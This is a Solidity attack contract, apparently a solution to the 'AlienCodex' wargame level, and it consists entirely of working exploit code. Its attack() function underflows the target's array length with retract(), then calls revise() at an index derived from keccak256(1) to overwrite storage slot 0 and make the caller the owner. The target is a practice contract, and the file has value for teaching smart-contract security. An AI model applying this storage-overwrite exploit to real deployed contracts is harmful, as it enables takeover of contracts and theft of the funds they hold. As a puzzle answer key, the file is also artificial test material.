pragma solidity ^0.8.10;

interface IAlienCodex {    
    function owner() external returns(address);
    function make_contact() external;     
    function retract() external;     
    function revise(uint i, bytes32 _content) external;
}

contract AttackAlienCodex {
    address public victim;
    IAlienCodex public a;        

    constructor(address _victim) { 
        victim = _victim;                   
    }

    function attack () public {
        a = IAlienCodex(victim);
        a.make_contact();
        a.retract();
        a.revise((2**256 - 1) - uint(keccak256(abi.encodePacked(uint(1)))) + 1,bytes32(bytes20(msg.sender)));
    }
}